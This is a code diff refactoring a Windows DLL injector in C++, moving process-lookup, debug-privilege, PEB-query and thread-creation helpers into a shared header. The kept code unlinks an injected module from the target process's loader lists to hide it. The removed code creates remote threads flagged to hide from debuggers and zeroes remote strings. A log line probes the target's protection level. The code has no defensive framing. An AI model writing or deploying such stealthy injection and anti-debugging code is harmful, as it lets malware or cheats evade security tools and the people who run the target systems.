@@ -8,39 +8,23 @@
 #include <string>
 #include <vector>
 
+#include "common/inject_common.hpp"
+
 namespace {
 
-typedef LONG NTSTATUS;
+using inject::NtQueryInformationProcessFn;
+using inject::NtCreateThreadExFn;
+using inject::ProcessBasicInformation;
+using inject::UnicodeStringRef;
+using inject::LdrEntry;
+using inject::FindProcess;
+using inject::WaitForProcess;
+using inject::EnableDebugPrivilege;
+using inject::QueryPeb;
+using inject::ZeroRemoteString;
+using inject::CreateHiddenThread;
 
-struct ProcessBasicInformation {
-    PVOID Reserved1;
-    PVOID PebBaseAddress;
-    PVOID Reserved2[2];
-    ULONG_PTR UniqueProcessId;
-    PVOID Reserved3;
-};
-
-struct UnicodeStringRef {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR Buffer;
-};
-
-struct LdrEntry {
-    LIST_ENTRY InLoadOrderLinks;
-    LIST_ENTRY InMemoryOrderLinks;
-    LIST_ENTRY InInitializationOrderLinks;
-    PVOID DllBase;
-    PVOID EntryPoint;
-    ULONG SizeOfImage;
-    UnicodeStringRef FullDllName;
-    UnicodeStringRef BaseDllName;
-};
-
-using NtQueryInformationProcessFn = NTSTATUS(WINAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
-using NtCreateThreadExFn = NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
-                                             PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
-using NtReadVirtualMemoryFn = NTSTATUS(WINAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+using NtReadVirtualMemoryFn = LONG(WINAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 
 std::wstring g_log_path;
 NtReadVirtualMemoryFn g_nt_read = nullptr;
@@ -57,8 +41,8 @@ bool InitNtRead() {
 bool ReadBlock(HANDLE process, uintptr_t address, void* buffer, SIZE_T size, SIZE_T* got) {
     if (!g_nt_read) return false;
     SIZE_T local = 0;
-    NTSTATUS status = g_nt_read(process, reinterpret_cast<PVOID>(address), buffer, size,
-                                got ? got : &local);
+    LONG status = g_nt_read(process, reinterpret_cast<PVOID>(address), buffer, size,
+                            got ? got : &local);
     return status == 0;
 }
 
@@ -110,64 +94,7 @@ std::wstring BaseName(const std::wstring& path) {
     return pos == std::wstring::npos ? path : path.substr(pos + 1);
 }
 
-DWORD FindProcess(const wchar_t* name) {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-    PROCESSENTRY32W entry{};
-    entry.dwSize = sizeof(entry);
-    DWORD pid = 0;
-    if (Process32FirstW(snap, &entry)) {
-        do {
-            if (_wcsicmp(entry.szExeFile, name) == 0) {
-                pid = entry.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(snap, &entry));
-    }
-    CloseHandle(snap);
-    return pid;
-}
-
-DWORD WaitForProcess(const wchar_t* name, int seconds) {
-    int tries = seconds > 0 ? seconds * 2 : 1;
-    for (int i = 0; i < tries; ++i) {
-        DWORD pid = FindProcess(name);
-        if (pid) return pid;
-        Sleep(500);
-    }
-    return 0;
-}
-
-bool EnableDebugPrivilege() {
-    HANDLE token = nullptr;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
-        return false;
-    LUID luid{};
-    if (!LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &luid)) {
-        CloseHandle(token);
-        return false;
-    }
-    TOKEN_PRIVILEGES tp{};
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
-    DWORD err = GetLastError();
-    CloseHandle(token);
-    return ok && err == ERROR_SUCCESS;
-}
-
-uintptr_t QueryPeb(HANDLE process) {
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    if (!ntdll) return 0;
-    auto query = reinterpret_cast<NtQueryInformationProcessFn>(
-        GetProcAddress(ntdll, "NtQueryInformationProcess"));
-    if (!query) return 0;
-    ProcessBasicInformation info{};
-    ULONG size = 0;
-    NTSTATUS status = query(process, 0, &info, sizeof(info), &size);
-    return status == 0 ? reinterpret_cast<uintptr_t>(info.PebBaseAddress) : 0;
-}
+// FindProcess, WaitForProcess, EnableDebugPrivilege, QueryPeb: inject_common.hpp
 
 bool ReadRemoteWide(HANDLE process, const UnicodeStringRef& str, std::wstring& out) {
     if (!str.Buffer || str.Length == 0) return false;
@@ -191,9 +118,9 @@ uintptr_t FindModuleBase(HANDLE process, uintptr_t peb, const std::wstring& modu
     if (!ReadMem(process, head, cursor)) return 0;
     for (int guard = 0; guard < 2048 && cursor && cursor != head; ++guard) {
         LdrEntry entry{};
-        if (!ReadMem(process, cursor - 0x10, entry)) return 0;
+        if (!(ReadMem)(process, cursor - 0x10, entry)) return 0;
         std::wstring name;
-        if (ReadRemoteWide(process, entry.BaseDllName, name) &&
+        if ((ReadRemoteWide)(process, entry.BaseDllName, name) &&
             _wcsicmp(name.c_str(), module_name.c_str()) == 0) {
             return reinterpret_cast<uintptr_t>(entry.DllBase);
         }
@@ -204,12 +131,7 @@ uintptr_t FindModuleBase(HANDLE process, uintptr_t peb, const std::wstring& modu
     return 0;
 }
 
-void ZeroRemoteString(HANDLE process, const UnicodeStringRef& str) {
-    if (!str.Buffer || str.Length == 0) return;
-    std::vector<BYTE> zeros(str.Length, 0);
-    SIZE_T put = 0;
-    WriteProcessMemory(process, str.Buffer, zeros.data(), zeros.size(), &put);
-}
+// ZeroRemoteString: inject_common.hpp
 
 bool HideModuleFromPeb(HANDLE process, uintptr_t module_base, uintptr_t peb) {
     if (!module_base || !peb) return false;
@@ -222,13 +144,13 @@ bool HideModuleFromPeb(HANDLE process, uintptr_t module_base, uintptr_t peb) {
     for (int guard = 0; guard < 2048 && cursor && cursor != head; ++guard) {
         uintptr_t entry_address = cursor - 0x10;
         LdrEntry entry{};
-        if (!ReadMem(process, entry_address, entry)) return false;
+        if (!(ReadMem)(process, entry_address, entry)) return false;
         if (reinterpret_cast<uintptr_t>(entry.DllBase) == module_base) {
             const uintptr_t links[3] = {entry_address, entry_address + 0x10,
                                         entry_address + 0x20};
             for (uintptr_t link_address : links) {
                 LIST_ENTRY link{};
-                if (!ReadMem(process, link_address, link)) continue;
+                if (!(ReadMem)(process, link_address, link)) continue;
                 uintptr_t prev = reinterpret_cast<uintptr_t>(link.Blink);
                 uintptr_t next = reinterpret_cast<uintptr_t>(link.Flink);
                 if (!prev || !next) continue;
@@ -246,23 +168,7 @@ bool HideModuleFromPeb(HANDLE process, uintptr_t module_base, uintptr_t peb) {
     return false;
 }
 
-HANDLE CreateHiddenThread(HANDLE process, void* start, void* arg) {
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    if (ntdll) {
-        auto create = reinterpret_cast<NtCreateThreadExFn>(
-            GetProcAddress(ntdll, "NtCreateThreadEx"));
-        if (create) {
-            HANDLE thread = nullptr;
-            constexpr ULONG kHideFromDebugger = 0x4;
-            NTSTATUS status = create(&thread, THREAD_ALL_ACCESS, nullptr, process, start, arg,
-                                     kHideFromDebugger, 0, 0, 0, nullptr);
-            if (status == 0 && thread) return thread;
-            Log("NtCreateThreadEx failed status=0x%lx, falling back", (unsigned long)status);
-        }
-    }
-    return CreateRemoteThread(process, nullptr, 0,
-                              reinterpret_cast<LPTHREAD_START_ROUTINE>(start), arg, 0, nullptr);
-}
+// CreateHiddenThread: inject_common.hpp
 
 bool ParsePid(const char* text, DWORD& pid) {
     if (!text || !*text) return false;
@@ -322,7 +228,7 @@ void LogProtectionLevel(HANDLE process) {
         BYTE Signer;
     } info{};
     ULONG size = 0;
-    NTSTATUS status = query(process, 61, &info, sizeof(info), &size);
+    LONG status = query(process, 61, &info, sizeof(info), &size);
     if (status == 0) {
         Log("process protection level=%u type=%u signer=%u (HyperShield/PPL probe)",
             (unsigned)info.Level, (unsigned)info.Type, (unsigned)info.Signer);
